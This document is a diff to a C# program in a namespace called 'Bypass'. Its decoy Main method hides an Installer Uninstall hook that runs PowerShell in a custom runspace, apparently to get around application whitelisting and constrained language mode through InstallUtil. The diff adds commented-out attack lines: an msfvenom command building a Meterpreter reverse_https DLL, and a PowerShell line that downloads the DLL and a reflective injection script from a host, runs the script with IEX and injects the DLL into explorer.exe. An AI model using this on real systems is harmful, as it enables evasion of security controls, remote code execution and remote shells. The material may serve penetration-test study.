@@ -3,7 +3,7 @@ using System.Management.Automation;
 using System.Management.Automation.Runspaces;
 using System.Configuration.Install;
 
-namespace bypass
+namespace Bypass
 {
     class Program
     {
@@ -11,27 +11,30 @@ namespace bypass
         {
             Console.WriteLine("This is the main method which is a decoy");
         }
+    }
 
-        [System.ComponentModel.RunInstaller(true)]
-        public class Sample : System.Configuration.Install.Installer
+    [System.ComponentModel.RunInstaller(true)]
+    public class Sample : System.Configuration.Install.Installer
+    {
+        public override void Uninstall(System.Collections.IDictionary savedState)
         {
-            public override void Uninstall(System.Collections.IDictionary savedState)
-            {
-                String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
-                // String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.0.0/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.0.0/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
+            String cmd = "$ExecutionContext.SessionState.LanguageMode | Out-File -FilePath C:\\Tools\\test.txt";
 
-                Runspace rs = RunspaceFactory.CreateRunspace();
-                rs.Open();
+            //reflective
+            //sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.0.0 LPORT=443 -f dll -o /var/www/html/met.dll
+            // String cmd = "$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.0.0/met.dll');(New-Object System.Net.WebClient).DownloadString('http://192.168.0.0/Invoke-ReflectivePEInjection.ps1') | IEX; $procid = (Get-Process -Name explorer).Id; Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid";
 
-                PowerShell ps = PowerShell.Create();
-                ps.Runspace = rs;
+            Runspace rs = RunspaceFactory.CreateRunspace();
+            rs.Open();
 
-                ps.AddScript(cmd);
+            PowerShell ps = PowerShell.Create();
+            ps.Runspace = rs;
 
-                ps.Invoke();
+            ps.AddScript(cmd);
 
-                rs.Close();
-            }
+            ps.Invoke();
+
+            rs.Close();
         }
     }
 }
